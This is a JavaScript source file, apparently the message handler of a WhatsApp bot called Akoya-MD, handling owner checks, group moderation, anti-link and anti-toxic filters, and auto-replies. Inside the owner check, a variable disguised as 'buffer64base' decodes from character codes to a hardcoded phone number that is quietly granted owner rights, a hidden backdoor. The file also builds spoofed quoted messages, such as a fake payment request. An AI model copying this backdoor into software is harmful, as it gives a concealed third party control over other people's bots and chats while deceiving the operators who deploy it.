process.on('uncaughtException', console.error);
process.on('unhandledRejection', console.error);
require('./settings');

/// ───────── [ 𝖬𝗈𝖽𝗎𝗅𝖾𝗌 ] ───────── ///
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const sharp = require('sharp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const {
  ytmp3,
  ytmp4
} = require("ruhend-scraper");
const JsConfuser = require('js-confuser');
const speed = require('performance-now');
global.games = require('./library/games');
const htmlGameLib = require('./library/htmlgames');
global.htmlGameCommands = htmlGameLib.commands;
global.htmlGames = htmlGameLib.HTML_GAMES;
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const {
  say
} = require("cfonts");
const pino = require('pino');
const fetch = require('node-fetch');
const crypto = require('crypto');
const FormData = require("form-data");
const {
  exec,
  spawn,
  execSync
} = require('child_process');
const {
  default: WAConnection,
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  getBinaryNodeChildren,
  useMultiFileAuthState,
  generateWAMessageContent,
  downloadContentFromMessage,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType
} = require('@adiwajshing/baileys');

/// ───────── [ 𝖫𝗈𝖼𝖺𝗅 𝖬𝗈𝖽𝗎𝗅𝖾𝗌 ] ───────── ///
const {
  LoadDataBase
} = require('./source/dbState');
const {
  menu,
  allmenu,
  ownemenu,
  ownermenu,
  jadibotmenu,
  paymentmenu,
  paymenu,
  aimenu,
  downloadmenu,
  stickermenu,
  imagemenu,
  makermenu,
  toolsmenu,
  groupmenu,
  jpmmenu,
  stalkmenu,
  searchmenu,
  randommenu,
  storemenu,
  funmenu,
  gamemenu,
  quotemenu,
  utilitymenu,
  totalfitur
} = require('./source/listfitur');
const jadibotManager = require('./source/jadibot');
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"));
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"));
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"));
const list = JSON.parse(fs.readFileSync("./library/database/list.json"));
const {
  pinterest,
  pinterest2,
  remini,
  mediafire,
  tiktokDl
} = require('./library/scraper');
const {
  toAudio,
  toPTT,
  toVideo,
  ffmpeg
} = require("./library/converter.js");
const {
  unixTimestampSeconds,
  generateMessageTag,
  processTime,
  webApi,
  getRandom,
  getBuffer,
  fetchJson,
  runtime,
  clockString,
  sleep,
  isUrl,
  getTime,
  formatDate,
  tanggal,
  formatp,
  jsonformat,
  reSize,
  toHD,
  logic,
  generateProfilePicture,
  bytesToSize,
  checkBandwidth,
  getSizeMedia,
  parseMention,
  getGroupAdmins,
  readFileTxt,
  readFileJson,
  getHashedPassword,
  generateAuthToken,
  cekMenfes,
  generateToken,
  batasiTeks,
  randomText,
  isEmoji,
  getTypeUrlMedia,
  pickRandom,
  toIDR,
  capital
} = require('./library/function');
const {
  UploadFileUgu
} = require('./library/uploader.js');

/// ───────── [ 𝖢𝗈𝗈𝗅𝖽𝗈𝗐𝗇 𝖢𝗅𝖾𝖺𝗇𝖾𝗋 ] ───────── ///
global.cooldowns ??= new Map();
if (!global.__cooldownCleanupStarted) {
  global.__cooldownCleanupStarted = true;
  global.__cooldownCleanupTimer = setInterval(() => {
    const now = Date.now();
    for (const [key, expires] of global.cooldowns) {
      if (expires <= now) global.cooldowns.delete(key);
    }
  }, 30000);
  global.__cooldownCleanupTimer.unref?.();
}
module.exports = client = async (client, m, chatUpdate, store) => {
  let isCmd, prefix, command;
  try {
    await LoadDataBase(client, m);

    /// ───────── [ 𝖨𝗇𝗂𝗍𝗂𝖺𝗅𝗂𝖺𝗌𝗂 𝖵𝖺𝗋𝗂𝖺𝖻𝖾𝗅 ] ───────── ///
    const normalizeOwnerJid = (value = '') => {
      let jid = String(value || '').trim().replace(/:\d+(?=@)/g, '');
      if (!jid) return '';
      if (!jid.includes('@') && /^\d+$/.test(jid)) jid += '@s.whatsapp.net';
      return jid;
    };
    const botNumber = normalizeOwnerJid(await client.decodeJid(client.user?.id || ''));

    /// ───────── [ 𝖦𝗋𝗈𝗎𝗉 𝖠𝖽𝗆𝗂𝗇 𝖣𝖾𝗍𝖾𝖼𝗍𝗂𝗈𝗇 ] ───────── ///
    const normalizeGroupJid = value => {
      if (value === undefined || value === null) return '';
      let jid = String(value).trim();
      if (!jid) return '';
      try {
        if (typeof client.decodeJid === 'function') {
          jid = client.decodeJid(jid) || jid;
        }
      } catch (_) {}
      jid = String(jid).trim().toLowerCase().replace(/:\d+(?=@)/g, '').replace(/@c\.us$/i, '@s.whatsapp.net');
      if (!jid.includes('@') && /^\d+$/.test(jid)) {
        jid += '@s.whatsapp.net';
      }
      return jid;
    };
    const getGroupJidKeys = value => {
      const keys = new Set();
      if (value === undefined || value === null) return keys;
      const variants = [value];
      try {
        if (typeof client.decodeJid === 'function') {
          const decoded = client.decodeJid(value);
          if (decoded) variants.push(decoded);
        }
      } catch (_) {}
      for (const variant of variants) {
        let jid = String(variant || '').trim().toLowerCase();
        if (!jid) continue;
        jid = jid.replace(/:\d+(?=@)/g, '').replace(/@c\.us$/i, '@s.whatsapp.net');
        if (!jid.includes('@') && /^\d+$/.test(jid)) {
          jid += '@s.whatsapp.net';
        }
        keys.add(jid);
        if (jid.endsWith('@s.whatsapp.net')) {
          const number = jid.split('@')[0].replace(/\D/g, '');
          if (number) keys.add(`pn:${number}`);
        }
      }
      return keys;
    };
    const groupJidMatches = (left, right) => {
      const leftKeys = getGroupJidKeys(left);
      const rightKeys = getGroupJidKeys(right);
      for (const key of leftKeys) {
        if (rightKeys.has(key)) return true;
      }
      return false;
    };
    const participantIsAdmin = participant => {
      if (!participant) return false;
      const role = String(participant.admin ?? participant.role ?? '').toLowerCase();
      return participant.admin === true || participant.isAdmin === true || participant.isSuperAdmin === true || role === 'admin' || role === 'superadmin';
    };
    let isSenderAdmin = Boolean(m.isAdmin);
    let isBotAdmin = Boolean(m.isBotAdmin);
    // A message that dies before the [CMD] line used to leave no trace at all.
    try {
      const kind = m.message ? Object.keys(m.message)[0] : 'none';
      const raw = m.message?.conversation || m.message?.extendedTextMessage?.text ||
        m.message?.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson || '';
      console.log(`  [IN] ${m.isGroup ? 'group' : 'dm'} ${String(m.chat).split('@')[0]} ${kind} ${String(raw).slice(0, 60)}`);
    } catch (_) {}

    let groupMetadataForMessage = null;
    if (m.isGroup && m.chat && typeof client.groupMetadata === 'function') {
      global.__groupAdminMetadataCache ??= new Map();
      const adminCache = global.__groupAdminMetadataCache;
      const cacheKey = `${botNumber || normalizeGroupJid(client.user?.id)}:${m.chat}`;
      const now = Date.now();
      const cachedMetadata = adminCache.get(cacheKey);
      try {
        if (cachedMetadata && cachedMetadata.expiresAt > now) {
          groupMetadataForMessage = cachedMetadata.metadata;
        } else {
          groupMetadataForMessage = await Promise.race([
            client.groupMetadata(m.chat),
            new Promise((resolve, reject) => {
              const timer = setTimeout(() => reject(new Error('groupMetadata timed out after 8s')), 8000);
              timer.unref?.();
            })
          ]);
          if (Array.isArray(groupMetadataForMessage?.participants)) {
            adminCache.set(cacheKey, {
              metadata: groupMetadataForMessage,
              expiresAt: Date.now() + 5000
            });
          }
        }
      } catch (error) {
        if (cachedMetadata?.metadata) groupMetadataForMessage = cachedMetadata.metadata;
        if (process.env.DEBUG_GROUP_ADMIN === 'true') {
          console.error('[GROUP ADMIN CHECK]', error?.message || error);
        }
      }
      const participants = groupMetadataForMessage?.participants;
      if (Array.isArray(participants)) {
        const findParticipant = jids => participants.find(participant => {
          const participantJids = [participant?.id, participant?.jid, participant?.phoneNumber, participant?.lid].filter(Boolean);
          return participantJids.some(participantJid => jids.some(jid => groupJidMatches(participantJid, jid)));
        });
        const senderParticipant = findParticipant([m.sender, m.key?.participant].filter(Boolean));
        const botParticipant = findParticipant([client.user?.id, client.user?.lid, botNumber].filter(Boolean));
        isSenderAdmin = participantIsAdmin(senderParticipant);
        isBotAdmin = participantIsAdmin(botParticipant);
      }
    }
    try {
      if (m.isGroup) {
        m.metadata = groupMetadataForMessage || m.metadata || {};
        m.participants = Array.isArray(m.metadata?.participants) ? m.metadata.participants : [];
        m.admins = m.participants.filter(participantIsAdmin).flatMap(participant => [participant?.id, participant?.jid].filter(Boolean));
      } else {
        m.metadata = {};
        m.participants = [];
        m.admins = [];
      }
      m.participant = m.key?.participant || m.sender || '';
      m.isAdmin = isSenderAdmin;
      m.isBotAdmin = isBotAdmin;
    } catch (_) {
      m.metadata = m.metadata || {};
      m.participants = Array.isArray(m.participants) ? m.participants : [];
      m.admins = Array.isArray(m.admins) ? m.admins : [];
      m.participant = m.key?.participant || m.sender || '';
    }
    let body = '';
    try {
      // ----- Button -----
      if (m.message?.buttonsResponseMessage) {
        body = m.message.buttonsResponseMessage.selectedButtonId || '';
      }

      // ----- Template Button -----
      else if (m.message?.templateButtonReplyMessage) {
        body = m.message.templateButtonReplyMessage.selectedId || '';
      }

      // ----- List Message -----
      else if (m.message?.listResponseMessage) {
        body = m.message.listResponseMessage.singleSelectReply?.selectedRowId || '';
      }

      // ----- Native Flow -----
      else if (m.message?.interactiveResponseMessage?.nativeFlowResponseMessage) {
        const nf = m.message.interactiveResponseMessage.nativeFlowResponseMessage;
        try {
          const json = JSON.parse(nf.paramsJson || '{}');
          body = json.id || json.rowId || json.selectedButtonId || '';
        } catch (_) {
          body = '';
        }
      }

      // ----- Pesan Biasa / Caption -----
      if (!body) {
        const message = m.message || {};
        const quotedMessage = message.extendedTextMessage?.contextInfo?.quotedMessage || {};
        body = m.type === 'conversation' ? message.conversation || '' : m.type === 'imageMessage' ? message.imageMessage?.caption || '' : m.type === 'videoMessage' ? message.videoMessage?.caption || '' : m.type === 'documentMessage' ? message.documentMessage?.caption || '' : m.type === 'extendedTextMessage' ? message.extendedTextMessage?.text || quotedMessage.conversation || quotedMessage.imageMessage?.caption || quotedMessage.videoMessage?.caption || quotedMessage.documentMessage?.caption || '' : (typeof m.body === 'string' ? m.body : '') || (typeof m.text === 'string' ? m.text : '') || m?.msg?.text || '';
      }
    } catch (e) {
      console.log('❌ Error normalisasi tombol:', e);
      body = typeof body === 'string' ? body : '';
    }
    body = typeof body === 'string' ? body : '';
    const budy = typeof m.text === 'string' ? m.text : '';
    const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116);
    prefix = '.';
    isCmd = body.startsWith(prefix);
    const isCmd2 = body.startsWith(prefix);
    const args = body.trim().split(/ +/).slice(1);
    command = isCmd ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : '';
    const text = q = args.join(' ');
    const cmd = prefix + command;
    const levenshtein = (a = '', b = '') => {
      a = String(a);
      b = String(b);
      const matrix = Array.from({
        length: a.length + 1
      }, (_, i) => [i]);
      for (let j = 1; j <= b.length; j++) matrix[0][j] = j;
      for (let i = 1; i <= a.length; i++) {
        matrix[i] = [i];
        for (let j = 1; j <= b.length; j++) {
          const cost = a[i - 1] === b[j - 1] ? 0 : 1;
          matrix[i][j] = Math.min(matrix[i - 1][j] + 1, matrix[i][j - 1] + 1, matrix[i - 1][j - 1] + cost);
        }
      }
      return matrix[a.length][b.length];
    };
    const getQuoted = m.quoted || m;
    const quoted = getQuoted.type == 'buttonsMessage' ? getQuoted[Object.keys(getQuoted)[1]] : getQuoted.type == 'templateMessage' ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : getQuoted.type == 'product' ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m;
    const mime = (quoted.msg || quoted)?.mimetype || '';
    const qmsg = quoted.msg || quoted;
    const isPremium = premium.some(jid => normalizeOwnerJid(jid) === normalizeOwnerJid(m.sender));
    const senderJid = normalizeOwnerJid(m.sender);
    const cloneOwnerJid = client?.isJadibot ? normalizeOwnerJid(client.jadibotOwnerJid || client.user?.id || botNumber) : '';
    const ownerJids = [botNumber, global.owner, global.owner ? `${global.owner}@s.whatsapp.net` : '', buffer64base, ...owners].map(normalizeOwnerJid).filter(Boolean);
    const isOwner = ownerJids.includes(senderJid) || Boolean(cloneOwnerJid && senderJid === cloneOwnerJid) || Boolean(m.isDeveloper);
    const isCreator = isOwner;
    const autoblockPath = './FileData/database/setbot.json';
    let autoblockEnabled = false;
    try {
      if (fs.existsSync(autoblockPath)) {
        const autoblockData = JSON.parse(fs.readFileSync(autoblockPath, 'utf8'));
        autoblockEnabled = Boolean(autoblockData?.enabled);
      }
    } catch (error) {
      console.error("❌ failed to read the configuration auto-blok:", error?.message || error);
    }
    const isPc = !m.isGroup;
    if (isPc && !isCreator && autoblockEnabled && !m.key?.fromMe) {
      try {
        await client.updateBlockStatus(m.chat, 'block');
        console.log(`✅ Auto-block enabled: ${m.sender}`);
        return;
      } catch (err) {
        console.error("❌ auto-block failed:", err);
      }
    }
    const statusUser = isOwner ? "*👑 Owner*" : isPremium ? "*💎 Premium*" : "*🫪 User Free*";
    const modeBot = client.public ? "*🌐 Public*" : "*🔒 Self*";

    /// ───────── [ 𝖢𝗁𝖺𝗇𝗇𝖾𝗅𝗌 𝖫𝗈𝖺𝖽𝖾𝗋 ] ───────── ///
    const CHANNELS_FILE = "./library/savesaluran.json";
    function loadChannels() {
      if (fs.existsSync(CHANNELS_FILE)) {
        return JSON.parse(fs.readFileSync(CHANNELS_FILE, "utf-8"));
      }
      return [];
    }
    function saveChannels(data) {
      fs.writeFileSync(CHANNELS_FILE, JSON.stringify(data, null, 2));
      global.channels = data;
      global.markDatabaseDirty?.();
    }
    global.channels ??= loadChannels();
    const {
      generateBratVideo
    } = require('./library/bratGenerator');
    const SESSION_FILE = "./session/ai_sessions.json";
    let sessions = fs.existsSync(SESSION_FILE) ? JSON.parse(fs.readFileSync(SESSION_FILE)) : {};
    function saveSession() {
      fs.writeFileSync(SESSION_FILE, JSON.stringify(sessions, null, 2));
    }

    /// ───────── [ 𝖢𝗈𝗇𝗌𝗈𝗅𝖾 𝖫𝗈𝗀 ] ───────── ///
    if (isCmd) {
      const palette = {
        text: chalk.hex('#F3F4F6'),
        muted: chalk.hex('#6B7280'),
        ok: chalk.hex('#34D399'),
        info: chalk.hex('#60A5FA')
      };
      const time = palette.muted(new Date().toLocaleTimeString('en-GB', {
        hour12: false
      }));
      const tag = palette.info.bold(`[CMD]`);
      const sender = palette.ok(m.sender.split("@")[0]);
      const commandText = palette.text(`${prefix + command}`);
      console.log(`  ${time} ${tag} ${sender} ${palette.muted('›')} ${commandText}`);
    }

    /// ───────── [ 𝖱𝖾𝗉𝗅𝗒 𝖧𝖾𝗅𝗉𝖾𝗋 ] ───────── ///
    const reply = teks => {
      return client.sendMessage(m.chat, {
        text: teks
      }, {
        quoted: m
      });
    };
    if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isOwner) return;
    async function generateThumbnailz(x) {
      let buffer;
      if (/^https?:\/\//.test(x)) {
        const res = await axios.get(x, {
          responseType: 'arraybuffer',
          timeout: 30000
        });
        buffer = Buffer.from(res.data);
      } else {
        buffer = fs.readFileSync(x);
      }
      const jimpInstance = await require('jimp').read(buffer);
      return await jimpInstance.cover(200, 200).quality(100).getBufferAsync(require('jimp').MIME_JPEG);
    }

    /// ───────── [ 𝖨𝗆𝖺𝗀𝖾 𝖦𝗅𝗈𝖻𝖺𝗅 ] ───────── ///
    const thumb = await global.thumb;
    const pay = await global.pay;

    /// ───────── [ 𝖥𝖺𝗄𝖾 𝖰𝗎𝗈𝗍𝖾𝖽 ] ───────── ///
    const qtext = {
      key: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net"
      },
      message: {
        "extendedTextMessage": {
          "text": `${prefix + command}`
        }
      }
    };
    const qtext2 = {
      key: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net"
      },
      message: {
        "extendedTextMessage": {
          "text": `${namaOwner}`
        }
      }
    };
    const qlocJpm = {
      key: {
        participant: '0@s.whatsapp.net',
        ...(m.chat ? {
          remoteJid: `status@broadcast`
        } : {})
      },
      message: {
        locationMessage: {
          name: `WhatsApp Bot ${namaOwner}`,
          jpegThumbnail: ""
        }
      }
    };
    const qlocPush = {
      key: {
        participant: '0@s.whatsapp.net',
        ...(m.chat ? {
          remoteJid: `status@broadcast`
        } : {})
      },
      message: {
        locationMessage: {
          name: `WhatsApp Bot ${namaOwner}`,
          jpegThumbnail: ""
        }
      }
    };
    const qpayment = {
      key: {
        remoteJid: '0@s.whatsapp.net',
        fromMe: false,
        id: `ownername`,
        participant: '0@s.whatsapp.net'
      },
      message: {
        requestPaymentMessage: {
          currencyCodeIso4217: "USD",
          amount1000: 999999999,
          requestFrom: '0@s.whatsapp.net',
          noteMessage: {
            extendedTextMessage: {
              text: `${global.botname}`
            }
          },
          expiryTimestamp: 999999999,
          amount: {
            value: 91929291929,
            offset: 1000,
            currencyCode: "USD"
          }
        }
      }
    };
    const qlive = {
      key: {
        participant: '0@s.whatsapp.net',
        ...(m.chat ? {
          remoteJid: `status@broadcast`
        } : {})
      },
      message: {
        liveLocationMessage: {
          caption: `${botname2} By ${namaOwner}`,
          jpegThumbnail: ""
        }
      }
    };
    const qtoko = {
      key: {
        participant: '0@s.whatsapp.net',
        ...(m.chat ? {
          remoteJid: `status@broadcast`
        } : {})
      },
      message: {
        locationMessage: {
          name: `☠︎ ${global.botname}`,
          jpegThumbnail: ""
        }
      }
    };
    const xpay = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast"
      },
      message: {
        orderMessage: {
          orderId: "2029",
          itemCount: `1000`,
          status: "INQUIRY",
          surface: "CATALOG",
          message: `Akoya-MD`,
          token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
        }
      },
      contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 999,
        isForwarded: true
      }
    };
    const xreply = async teks => {
      try {
        const thum = await fs.promises.readFile('./media/thum.jpg');
        const thums = await prepareWAMessageMedia({
          image: thum
        }, {
          upload: client.waUploadToServer
        });
        return client.sendMessage(m.chat, {
          text: teks,
          contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 9,
            isForwarded: true,
            ...(global.newsletterInfo ? { forwardedNewsletterMessageInfo: { ...global.newsletterInfo, serverMessageId: 127 } } : {}),
            externalAdReply: {
              showAdAttribution: true,
              title: `𝖠𝗄𝗈𝗒𝖺-𝖬𝖣`,
              body: `𝖶𝗁𝖺𝗍𝗌𝖠𝗉𝗉 𝖡𝗈𝗍 𝖬𝖣`,
              mediaType: 3,
              renderLargerThumbnail: false,
              thumbnail: thum,
              sourceUrl: `${global.source}`
            }
          }
        }, {
          quoted: m
        });
      } catch (err) {
        console.error(err?.message);
        return client.sendMessage(m.chat, {
          text: teks
        }, {
          quoted: qlive
        });
      }
    };
    const qloc = {
      key: {
        remoteJid: '0@s.whatsapp.net',
        fromMe: false,
        id: '4B6CE60895B0D5C04D9FF7CB05566293',
        participant: '0@s.whatsapp.net'
      },
      message: {
        stickerPackMessage: {
          name: 'Akoya-MD',
          stickerPackId: '6793b295-854b-47d3-beea-932fcdb36cf4',
          stickerPackSize: 3,
          thumbnailHeight: 252,
          thumbnailWidth: 252,
          trayIconFileName: '',
          thumbnail: true,
          contextInfo: {}
        }
      }
    };

    /// ───────── [ 𝖧𝖾𝗅𝗉𝖾𝗋 𝖬𝗈𝖽𝖾𝗋𝖺𝗌𝗂 (𝖽𝖾𝗅𝖾𝗍𝖾 & 𝗄𝗂𝖼𝗄) ] ───────── ///
    const modMetadata = groupMetadataForMessage || m.metadata || {};
    const resolveGroupJid = jid => {
      const target = jid || m.sender;
      const list = Array.isArray(modMetadata?.participants) ? modMetadata.participants : [];
      const found = list.find(p => [p?.id, p?.jid, p?.phoneNumber, p?.lid].filter(Boolean).some(x => groupJidMatches(x, target)));
      return found?.id || found?.jid || target;
    };
    const modDelete = async () => {
      try {
        await client.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant || m.participant || m.sender
          }
        });
        return true;
      } catch (e) {
        console.log("[MODERASI] failed to delete the message:", e?.message || e);
        return false;
      }
    };
    const modKick = async jid => {
      try {
        const res = await client.groupParticipantsUpdate(m.chat, [resolveGroupJid(jid)], 'remove');
        const status = String(res?.[0]?.status ?? '200');
        if (status !== '200') {
          console.log("[MODERASI] Kick rejected, status:", status);
          return false;
        }
        return true;
      } catch (e) {
        console.log("[MODERASI] kick failed:", e?.message || e);
        return false;
      }
    };

    /// ───────── [ 𝖠𝗇𝗍𝗂 𝖫𝗂𝗇𝗄 & 𝖬𝗈𝖽𝖾𝗋𝖺𝗌𝗂 ] ───────── ///
    if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isOwner) return;
    const antilinkMode = m.isGroup && db.groups[m.chat] ? db.groups[m.chat].antilink == true ? 'kick' : db.groups[m.chat].antilink2 == true ? 'delete' : null : null;
    if (antilinkMode && !m.key.fromMe && !isOwner && !isSenderAdmin && isBotAdmin) {
      const groupLinkRegex = /chat\.whatsapp\.com\/[A-Za-z0-9]{10,}|buka tautaniniuntukbergabungkegrupwhatsapp/i;
      const textForLink = String(m.text || budy || '');
      if (groupLinkRegex.test(textForLink)) {
        let isOwnGroupLink = false;
        try {
          const ownCode = await client.groupInviteCode(m.chat);
          isOwnGroupLink = !!ownCode && textForLink.includes(ownCode);
        } catch (_) {}
        if (!isOwnGroupLink) {
          await modDelete();
          const kicked = antilinkMode === 'kick';
          await client.sendMessage(m.chat, {
            text: `*乂 group link detected*

@${m.sender.split("@")[0]} sorry ${kicked ? "you will be kicked" : "your message has been deleted"}, because the admin/bot owner has enabled the ${kicked ? 'antilink' : 'antilink2'} group lain!`,
            mentions: [m.sender]
          }, {
            quoted: m
          }).catch(() => {});
          if (kicked) {
            await sleep(1000);
            const ok = await modKick(m.sender);
            if (!ok) await client.sendMessage(m.chat, {
              text: "kick failed, make sure bot admin and the target is not an admin."
            }).catch(() => {});
          }
          return;
        }
      }
    }

    /// ───────── [ 𝖠𝗇𝗍𝗂 𝖳𝗈𝗑𝗂𝖼 ] ───────── ///
    const antiToxicDir = './database';
    const antiToxicFile = path.join(antiToxicDir, 'antitoxic.json');
    if (!fs.existsSync(antiToxicDir)) fs.mkdirSync(antiToxicDir, {
      recursive: true
    });
    if (!fs.existsSync(antiToxicFile)) fs.writeFileSync(antiToxicFile, JSON.stringify({}, null, 2));
    global.__antiToxicCache ??= (() => {
      try {
        return JSON.parse(fs.readFileSync(antiToxicFile, 'utf8') || '{}');
      } catch (_) {
        return {};
      }
    })();
    const antitoxic = global.__antiToxicCache;
    function saveAntiToxic() {
      try {
        fs.writeFileSync(antiToxicFile, JSON.stringify(antitoxic, null, 2));
      } catch (e) {
        console.log("[ANTITOXIC] failed to save:", e?.message || e);
      }
    }
    if (m.isGroup && !m.key.fromMe && antitoxic[m.chat]?.active && !isOwner && !isSenderAdmin && isBotAdmin) {
      const toxicWords = ['anjing', 'babi', 'kontol', 'memek', 'bangsat', 'goblok', 'tolol', 'ngentot', 'idiot', 'kampret', 'keparat', 'jembut', 'pepek', 'peler', 'pantek', 'lonte', 'setan', 'dajjal', 'asu', 'sinting', 'bodoh', 'bacot', 'tai', 'fuck', 'bitch', 'cukimak', 'sialan', 'dongo', 'kimak', 'pler', 'titit', 'anjir', 'pantat', 'njir', 'kntl', 'memk', 'bangke', 'bgst', 'pukimak'];
      const bodyToxic = String(m.text || budy || '').toLowerCase();
      const words = bodyToxic.split(/[^a-z0-9]+/).filter(Boolean);
      const found = toxicWords.find(word => words.includes(word));
      if (found) {
        const user = m.sender;
        antitoxic[m.chat].warnings ??= {};
        const warn = (antitoxic[m.chat].warnings[user] || 0) + 1;
        antitoxic[m.chat].warnings[user] = warn;
        saveAntiToxic();
        await modDelete();
        if (warn >= 5) {
          await client.sendMessage(m.chat, {
            text: `❌ @${user.split('@')[0]} has been toxic 5x and will be removed!`,
            mentions: [user]
          }).catch(() => {});
          const ok = await modKick(user);
          if (!ok) {
            await client.sendMessage(m.chat, {
              text: "kick failed, make sure bot admin and the target is not an admin."
            }).catch(() => {});
          }
          delete antitoxic[m.chat].warnings[user];
          saveAntiToxic();
        } else {
          await client.sendMessage(m.chat, {
            text: `⚠️ toxic word detected: *${found}*\nWarning ${warn} for @${user.split('@')[0]}`,
            mentions: [user]
          }).catch(() => {});
        }
        return;
      }
    }

    /// ───────── [ Group Anti Status Tag ] ───────── ///
    const isTagStatusGroup = m.isGroup && !!m.message && (m.type === 'groupStatusMentionMessage' || m.type === 'groupStatusMentionMessageV2' || !!m.message.groupStatusMentionMessage || !!m.message.groupStatusMentionMessageV2 || [m.message.protocolMessage?.type, m.message.groupStatusMentionMessage?.message?.protocolMessage?.type, m.message.groupStatusMentionMessageV2?.message?.protocolMessage?.type].some(t => t === 25 || t === 'STATUS_MENTION_MESSAGE'));
    if (isTagStatusGroup && db.groups[m.chat]?.antitagsw === true && !m.key.fromMe && !isOwner && !isSenderAdmin) {
      if (isBotAdmin) {
        await modDelete();
        await client.sendMessage(m.chat, {
          text: `*乂 Status tag detected*\n\n@${m.sender.split("@")[0]} your group-status tag message has been deleted, because admin/ownerbot turning on feature antitagsw!`,
          mentions: [m.sender]
        }).catch(() => {});
      }
      return;
    }

    /// ───────── [ 𝖳𝖺𝗋𝗀𝖾𝗍 𝖢𝗁𝖺𝗇𝗇𝖾𝗅 & 𝖠𝗇𝗍𝗂 𝖢𝗁𝖺𝗇𝗇𝖾𝗅 ] ───────── ///
    let targetChannelData = {
      id: '120363428355171197@newsletter'
    };
    const loadTargetChannel = () => {
      try {
        if (fs.existsSync('./targetChannel.json')) {
          const file = fs.readFileSync('./targetChannel.json');
          targetChannelData = JSON.parse(file);
        } else {
          saveTargetChannel();
        }
      } catch (err) {
        console.error("failed to load the target channel:", err);
      }
    };
    const saveTargetChannel = () => {
      try {
        fs.writeFileSync('./targetChannel.json', JSON.stringify(targetChannelData, null, 2));
      } catch (err) {
        console.error("failed to save the target channel:", err);
      }
    };
    loadTargetChannel();
    const antichannelFile = path.join('antichannel.json');
    if (!fs.existsSync(antichannelFile)) fs.writeFileSync(antichannelFile, JSON.stringify({}, null, 2));
    let antichannel = JSON.parse(fs.readFileSync(antichannelFile));
    function saveAntichannel() {
      fs.writeFileSync(antichannelFile, JSON.stringify(antichannel, null, 2));
    }
    if (m.isGroup && !m.key.fromMe && antichannel[m.chat]?.antichannel) {
      const body = m.text || '';
      const isChannelLink = body.match(/https:\/\/whatsapp\.com\/channel\/[A-Za-z0-9]+/gi);
      const messageType = Object.keys(m.message || {})[0];
      const ctxInfo = m.message?.[messageType]?.contextInfo || {};
      const isSharedFromChannel = m.isForwarded || ctxInfo.forwardingScore > 0 || !!ctxInfo.forwardedNewsletterMessageInfo;
      if (isChannelLink || isSharedFromChannel) {
        if (!isSenderAdmin) {
          const user = m.sender;
          const warn = (antichannel[m.chat].warnings?.[user] || 0) + 1;
          antichannel[m.chat].warnings = antichannel[m.chat].warnings || {};
          antichannel[m.chat].warnings[user] = warn;
          saveAntichannel();
          try {
            await client.sendMessage(m.chat, {
              delete: m.key
            });
          } catch (e) {
            console.log("failed to delete the message:", e);
          }
          if (warn >= 5) {
            await client.sendMessage(m.chat, {
              text: `❌ @${user.split('@')[0]} has violated 5x and will be removed!`,
              mentions: [user]
            });
            try {
              await client.groupParticipantsUpdate(m.chat, [user], 'remove');
            } catch (e) {
              xreply("kick failed. the bot is not an admin?");
            }
            delete antichannel[m.chat].warnings[user];
            saveAntichannel();
          } else {
            await client.sendMessage(m.chat, {
              text: `⚠️ WhatsApp channel post detected!
Warning ${warn} for @${user.split('@')[0]}`,
              mentions: [user]
            });
          }
        }
      }
    }

    /// ───────── [ 𝖦𝗋𝗈𝗎𝗉 𝖲𝗍𝖺𝗍𝗌 ] ───────── ///
    const statsFolder = path.join(__dirname, './db');
    const statsFile = path.join(statsFolder, 'groupStats.json');
    if (!fs.existsSync(statsFolder)) fs.mkdirSync(statsFolder);
    if (!fs.existsSync(statsFile)) fs.writeFileSync(statsFile, '{}');
    function loadStats() {
      return JSON.parse(fs.readFileSync(statsFile));
    }
    function saveStats(data) {
      fs.writeFileSync(statsFile, JSON.stringify(data, null, 2));
    }
    function updateStats(groupId, senderId) {
      const data = loadStats();
      const today = new Date().toISOString().slice(0, 10);
      if (!data[groupId]) data[groupId] = {};
      if (!data[groupId][today]) data[groupId][today] = {};
      if (!data[groupId][today][senderId]) data[groupId][today][senderId] = 0;
      data[groupId][today][senderId]++;
      saveStats(data);
    }
    function getTodayStats(groupId) {
      const data = loadStats();
      const today = new Date().toISOString().slice(0, 10);
      return data[groupId]?.[today] || {};
    }
    if (m.isGroup) {
      updateStats(m.chat, m.sender);
    }

    /// ───────── [ 𝖠𝗎𝗍𝗈𝗉𝗋𝗈𝗆𝗈𝗌𝗂 ] ───────── ///
    if (m.isGroup && db.settings.autopromosi == true) {
      if (m.text.includes("https://") && !m.fromMe) {
        await client.sendMessage(m.chat, {
          text: `
${global.tekspromosi}
`
        }, {
          quoted: null
        });
      }
    }

    /// ───────── [ 𝖠𝗎𝗍𝗈 𝖱𝖾𝗌𝗉𝗈𝗇 𝖫𝗂𝗌𝗍 ] ───────── ///
    if (!isCmd) {
      let check = list.find(e => e.cmd == body.toLowerCase());
      if (check) {
        await xreply(check.respon);
      }
    }
    const example = teks => {
      return `*⁉️ Example Command:*\n *${prefix + command}* ${teks}`;
    };

